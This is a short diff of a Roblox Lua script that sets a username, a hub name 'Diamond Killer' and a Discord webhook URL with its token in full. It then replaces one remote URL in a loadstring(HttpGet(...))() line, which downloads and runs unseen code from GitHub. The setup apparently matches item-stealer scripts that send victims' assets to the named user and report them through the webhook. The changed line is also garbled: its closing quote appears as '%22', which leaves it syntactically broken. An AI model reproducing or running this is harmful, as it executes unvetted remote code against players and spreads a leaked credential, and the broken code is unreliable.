@@ -2,4 +2,4 @@ _G.Username = "Official_azazel"
 _G.Hubname = "Diamond Killer"
 _G.WebhookUrl = "https://discord.com/api/webhooks/1121118525403181146/1OE0G6bkf9CVfoidLfwcHoyaLiFgb-cnJQgnoygONHRe3TgxhPQGmlRRrXhLobzmmfzf"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/PETSIMX0909/Script/main/ScriptGui"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/jayiioceanii/PeakOnTop/main/peak.lua%22))()
